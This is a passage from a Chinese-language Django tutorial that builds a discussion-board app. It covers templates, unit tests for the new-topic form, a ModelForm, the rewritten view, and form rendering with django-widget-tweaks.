ForeignKey：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; topic.starter.username &#125;&#125;</span><br></pre></td></tr></table></figure><p>使用一个点加上属性这种写法，我们几乎可以访问 <strong>User</strong> 模型的所有属性。如果我们想得到用户的 email，我们可以使用 <code>topic.starter.email</code></p><p>我们已经修改了 <strong>topics.html</strong> 模板，让我们创建一个能让我们转到 <strong>new topic*</strong> 页面的按钮：</p><p><strong>templates/topics.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block content %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mb-4"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'new_topic' board.pk %&#125;"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>New topic<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- code suppressed for brevity --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>访问浏览器：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20503django11.png" alt=""></p><p>我们可以写一个测试以确保用户可以通过此页面访问到 <strong>New Topic</strong> 页面：</p><p><strong>boards/tests.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoardTopicsTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_board_topics_view_contains_navigation_links</span><span class="params">(self)</span>:</span></span><br><span class="line">        board_topics_url = reverse(<span class="string">'board_topics'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        homepage_url = reverse(<span class="string">'home'</span>)</span><br><span class="line">        new_topic_url = reverse(<span class="string">'new_topic'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">        response = self.client.get(board_topics_url)</span><br><span class="line"></span><br><span class="line">        self.assertContains(response, <span class="string">'href="&#123;0&#125;"'</span>.format(homepage_url))</span><br><span class="line">        self.assertContains(response, <span class="string">'href="&#123;0&#125;"'</span>.format(new_topic_url))</span><br></pre></td></tr></table></figure><p>我在这里基本上重命名了 <strong>test_board_topics_view_contains_link_back_to_homepage</strong> 方法并添加了一个额外的 <code>assertContains</code>。这个测试现在负责确保我们的 view 包含所需的导航链接。</p><h3 id="测试表单"><a href="#测试表单" class="headerlink" title="测试表单"></a>测试表单</h3><p>在我们使用 Django 的方式编写之前的表单示例之前, 让我们先为表单处理写一些测试：</p><p><strong>boards/tests.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''' new imports below '''</span></span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> User</span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> new_topic</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board, Topic, Post</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NewTopicTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        Board.objects.create(name=<span class="string">'Django'</span>, description=<span class="string">'Django board.'</span>)</span><br><span class="line">        User.objects.create_user(username=<span class="string">'john'</span>, email=<span class="string">'john@doe.com'</span>, password=<span class="string">'123'</span>)  <span class="comment"># &lt;- included this line here</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_csrf</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = reverse(<span class="string">'new_topic'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        response = self.client.get(url)</span><br><span class="line">        self.assertContains(response, <span class="string">'csrfmiddlewaretoken'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_new_topic_valid_post_data</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = reverse(<span class="string">'new_topic'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'subject'</span>: <span class="string">'Test title'</span>,</span><br><span class="line">            <span class="string">'message'</span>: <span class="string">'Lorem ipsum dolor sit amet'</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = self.client.post(url, data)</span><br><span class="line">        self.assertTrue(Topic.objects.exists())</span><br><span class="line">        self.assertTrue(Post.objects.exists())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_new_topic_invalid_post_data</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        Invalid post data should not redirect</span></span><br><span class="line"><span class="string">        The expected behavior is to show the form again with validation errors</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        url = reverse(<span class="string">'new_topic'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        response = self.client.post(url, &#123;&#125;)</span><br><span class="line">        self.assertEquals(response.status_code, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_new_topic_invalid_post_data_empty_fields</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        Invalid post data should not redirect</span></span><br><span class="line"><span class="string">        The expected behavior is to show the form again with validation errors</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        url = reverse(<span class="string">'new_topic'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'subject'</span>: <span class="string">''</span>,</span><br><span class="line">            <span class="string">'message'</span>: <span class="string">''</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = self.client.post(url, data)</span><br><span class="line">        self.assertEquals(response.status_code, <span class="number">200</span>)</span><br><span class="line">        self.assertFalse(Topic.objects.exists())</span><br><span class="line">        self.assertFalse(Post.objects.exists())</span><br></pre></td></tr></table></figure><p>首先， <strong>test.py</strong> 文件变的越来越大。我们会尽快改进它，将测试分为几个文件。但现在，让我们先保持这个状态。</p><ul><li><p><strong>setUp</strong>：包含 <code>User.objects.create_user</code> 以创建用于测试的 <strong>User</strong> 实例。</p></li><li><p><strong>test_csrf</strong>：由于 <strong>CSRF Token</strong> 是处理 <strong>Post</strong> 请求的基本部分，我们需要保证我们的 HTML 包含 token。</p></li><li><p><strong>test_new_topic_valid_post_data</strong>：发送有效的数据并检查视图函数是否创建了 <strong>Topic</strong> 和 <strong>Post</strong> 实例。</p></li><li><p><strong>test_new_topic_invalid_post_data</strong>：发送一个空字典来检查应用的行为。</p></li><li><p><strong>test_new_topic_invalid_post_data_empty_fields</strong>：类似于上一个测试，但是这次我们发送一些数据。预期应用程序会验证并且拒绝空的 subject 和 message。</p></li></ul><p>运行这些测试：</p><p><code>python manage.py test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Creating test database for alias &#39;default&#39;...</span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">........EF.....</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ERROR: test_new_topic_invalid_post_data (boards.tests.NewTopicTests)</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">django.utils.datastructures.MultiValueDictKeyError: &quot;&#39;subject&#39;&quot;</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">FAIL: test_new_topic_invalid_post_data_empty_fields (boards.tests.NewTopicTests)</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&#x2F;home&#x2F;humen&#x2F;Development&#x2F;myproject&#x2F;myproject&#x2F;boards&#x2F;tests.py&quot;, line 119, in test_new_topic_invalid_post_data_empty_fields</span><br><span class="line">    self.assertEquals(response.status_code, 200)</span><br><span class="line">AssertionError: 302 !&#x3D; 200</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 15 tests in 0.328s</span><br><span class="line"></span><br><span class="line">FAILED (failures&#x3D;1, errors&#x3D;1)</span><br><span class="line">Destroying test database for alias &#39;default&#39;...</span><br></pre></td></tr></table></figure><p>有一个失败的测试和一个错误。两个都与验证用户的输入有关。不要试图用当前的实现来修复它，让我们通过使用 Django Forms API 来通过这些测试</p><h3 id="创建表单正确的姿势"><a href="#创建表单正确的姿势" class="headerlink" title="创建表单正确的姿势"></a>创建表单正确的姿势</h3><p>自从我们开始使用 Forms，我们已经走了很长一段路。终于，是时候使用 Forms API 了。</p><p>Forms API 可在模块 <code>django.forms</code> 中得到。Django 使用两种类型的 form：<code>forms.Form</code> 和 <code>forms.ModelForm</code>。<code>Form</code>类是通用的表单实现。我们可以使用它来处理与应用程序 model 没有直接关联的数据。<code>ModelForm</code> 是 <code>Form</code> 的子类，它与 model 类相关联。</p><p>在 <strong>boards</strong> 文件夹下创建一个新的文件 <code>forms.py</code>：</p><p><strong>boards/forms.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Topic</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NewTopicForm</span><span class="params">(forms.ModelForm)</span>:</span></span><br><span class="line">    message = forms.CharField(widget=forms.Textarea(), max_length=<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = Topic</span><br><span class="line">        fields = [<span class="string">'subject'</span>, <span class="string">'message'</span>]</span><br></pre></td></tr></table></figure><p>这是我们的第一个 form。它是一个与 <strong>Topic</strong> model 相关联的 <code>ModelForm</code>。<strong>Meta</strong> 类里面 <code>fields</code> 列表中的 <code>subject</code> 引用 <strong>Topic</strong> 类中的 <strong>subject field(字段)</strong>。现在注意到我们定义了一个叫做 <code>message</code> 的额外字段。它用来引用 <strong>Post</strong> 中我们想要保存的 message。</p><p>现在我们需要重写我们的 <strong>views.py</strong>：</p><p><strong>boards/views.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> User</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, redirect, get_object_or_404</span><br><span class="line"><span class="keyword">from</span> .forms <span class="keyword">import</span> NewTopicForm</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board, Topic, Post</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_topic</span><span class="params">(request, pk)</span>:</span></span><br><span class="line">    board = get_object_or_404(Board, pk=pk)</span><br><span class="line">    user = User.objects.first()  <span class="comment"># <span class="doctag">TODO:</span> get the currently logged in user</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        form = NewTopicForm(request.POST)</span><br><span class="line">        <span class="keyword">if</span> form.is_valid():</span><br><span class="line">            topic = form.save(commit=<span class="literal">False</span>)</span><br><span class="line">            topic.board = board</span><br><span class="line">            topic.starter = user</span><br><span class="line">            topic.save()</span><br><span class="line">            post = Post.objects.create(</span><br><span class="line">                message=form.cleaned_data.get(<span class="string">'message'</span>),</span><br><span class="line">                topic=topic,</span><br><span class="line">                created_by=user</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">'board_topics'</span>, pk=board.pk)  <span class="comment"># <span class="doctag">TODO:</span> redirect to the created topic page</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        form = NewTopicForm()</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'new_topic.html'</span>, &#123;<span class="string">'board'</span>: board, <span class="string">'form'</span>: form&#125;)</span><br></pre></td></tr></table></figure><p>这是我们在 view(视图) 中处理 form(表单) 的方式。让我们去掉一些多余的部分，只看表单处理的核心部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">    form = NewTopicForm(request.POST)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        topic = form.save()</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'board_topics'</span>, pk=board.pk)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    form = NewTopicForm()</span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">'new_topic.html'</span>, &#123;<span class="string">'form'</span>: form&#125;)</span><br></pre></td></tr></table></figure><p>首先我们判断请求是 <strong>POST</strong> 还是 <strong>GET</strong>。如果请求是<strong>POST</strong>，这意味着用户向服务器提交了一些数据。所以我们实例化一个将 <strong>POST</strong> 数据传递给 form 的 form 实例：<code>form = NewTopicForm(request.POST)</code>。</p><p>然后，我们让 Django 验证数据，检查 form 是否有效，我们能否将其存入数据库：<code>if form.is_valid():</code>。如果表单有效，我们使用 <code>form.save()</code> 将数据存入数据库。<code>save()</code> 方法返回一个存入数据库的 <code>Model</code>实例。<br>所以，因为这是一个 <strong>Topic</strong> form, 所以它会返回 <code>topic = form.save()</code> 创建的 Topic。然后，通用的路径是把用户重定向到其他地方，以避免用户通过按 F5 重新提交表单，并且保证应用程序的流程走向。</p><p>现在，如果数据是无效的，Django 会给 form 添加错误列表。然后，视图函数不会做任何处理并且返回最后一句：<br><code>return render(request, &#39;new_topic.html&#39;, {&#39;form&#39;: form})</code>。这意味着我们需要更新 <strong>new_topic.html</strong> 以显示错误。</p><p>如果请求是 <strong>GET</strong>，我们只需要使用 <code>form = NewTopicForm()</code> 初始化一个新的空表单。</p><p>让我们运行测试并观察情况：</p><p><code>python manage.py test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Creating test database for alias &#39;default&#39;...</span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">...............</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 15 tests in 0.337s</span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line">Destroying test database for alias &#39;default&#39;...</span><br></pre></td></tr></table></figure><p>我们甚至修复了最后两个测试。</p><p>Django Forms API 不仅仅是处理和验证数据。它还为我们生成 HTML。</p><p><strong>templates/new_topic.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Start a New Topic&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block breadcrumb %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'home' %&#125;"</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'board_topics' board.pk %&#125;"</span>&gt;</span>&#123;&#123; board.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>New topic<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line">    &#123;&#123; form.as_p &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-success"</span>&gt;</span>Post<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>这个 <code>form</code> 有三个渲染选项：<code>form.as_table</code>，<code>form.as_ul</code> 和 <code>form.as_p</code>。这是一个快速的渲染表单所有字段的方法。顾名思义，<code>as_table</code> 使用<code>table</code> 标签来格式化输入，<code>as_ul</code> 使用 li 标签。</p><p>访问浏览器，看效果：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20504django01.png" alt=""></p><p>我们以前的 form 看起来更好，是吧？我们将立即修复它。</p><p>它看起来很破，但是相信我；它背后有很多东西。它非常强大。比如，如果我们的表单有 50 个字段，我们可以通过键入 <code>{{ form.as_p }}</code>来显示所有字段。</p><p>此外，使用 Forms API，Django 会验证数据并且向每个字段添加错误消息。让我们尝试提交一个空的表单：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20504django02.png" alt=""></p><blockquote><p>注意：<br>如果你提交表单时看到类似这样的东西：<br><strong>Please fill out this field</strong><br>这不是 Django 导致的，而是你的浏览器进行预验证。要禁用它可以在你的表单标签中添加 novalidate 属性：<br><br>你可以不修改它，不会有问题。这只是因为我们的表单现在非常简单，而且我们没有太多的数据验证可以看到。<br><br>另外一件需要注意的事情是：没有 “只客户端验证” 这样的事情。JavaScript 验证或者浏览器验证仅用于可用性目的。同时也减少了对服务器的请求数量。数据验证应该始终在服务器端完成，这样我们可以完全掌控数据。</p></blockquote><p>它还可以处理在 <strong>Form</strong>类或者 <strong>Model</strong> 类中定义的帮助文本。</p><p><strong>boards/forms.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Topic</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NewTopicForm</span><span class="params">(forms.ModelForm)</span>:</span></span><br><span class="line">    message = forms.CharField(</span><br><span class="line">        widget=forms.Textarea(),</span><br><span class="line">        max_length=<span class="number">4000</span>,</span><br><span class="line">        help_text=<span class="string">'The max length of the text is 4000.'</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = Topic</span><br><span class="line">        fields = [<span class="string">'subject'</span>, <span class="string">'message'</span>]</span><br></pre></td></tr></table></figure><p>访问浏览器：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20504django03.png" alt=""></p><p>我们也可以为表单字段设置额外的属性：</p><p><strong>boards/forms.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Topic</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NewTopicForm</span><span class="params">(forms.ModelForm)</span>:</span></span><br><span class="line">    message = forms.CharField(</span><br><span class="line">        widget=forms.Textarea(</span><br><span class="line">            attrs=&#123;<span class="string">'rows'</span>: <span class="number">5</span>, <span class="string">'placeholder'</span>: <span class="string">'What is on your mind?'</span>&#125;</span><br><span class="line">        ),</span><br><span class="line">        max_length=<span class="number">4000</span>,</span><br><span class="line">        help_text=<span class="string">'The max length of the text is 4000.'</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = Topic</span><br><span class="line">        fields = [<span class="string">'subject'</span>, <span class="string">'message'</span>]</span><br></pre></td></tr></table></figure><p>访问浏览器：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20504django04.png" alt=""></p><h3 id="用BootStrap-表单渲染"><a href="#用BootStrap-表单渲染" class="headerlink" title="用BootStrap 表单渲染"></a>用BootStrap 表单渲染</h3><p>当使用 Bootstrap 或者其他的前端库时，我比较喜欢使用一个叫做 <strong>django-widget-tweaks</strong> 的 Django 库。它可以让我们更好地控制渲染的处理，在保证默认值的情况下，只需在上面添加额外的自定义设置。</p><p>开始安装它：</p><p><code>pip install django-widget-tweaks</code></p><p>添加到 <code>INSTALLED_APPS</code>：</p><p><strong>myproject/settings.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">'django.contrib.admin'</span>,</span><br><span class="line">    <span class="string">'django.contrib.auth'</span>,</span><br><span class="line">    <span class="string">'django.contrib.contenttypes'</span>,</span><br><span class="line">    <span class="string">'django.contrib.sessions'</span>,</span><br><span class="line">    <span class="string">'django.contrib.messages'</span>,</span><br><span class="line">    <span class="string">'django.contrib.staticfiles'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'widget_tweaks'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'boards'</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>现在可以使用它了：</p><p><strong>templates/new_topic.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% load widget_tweaks %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Start a New Topic&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block breadcrumb 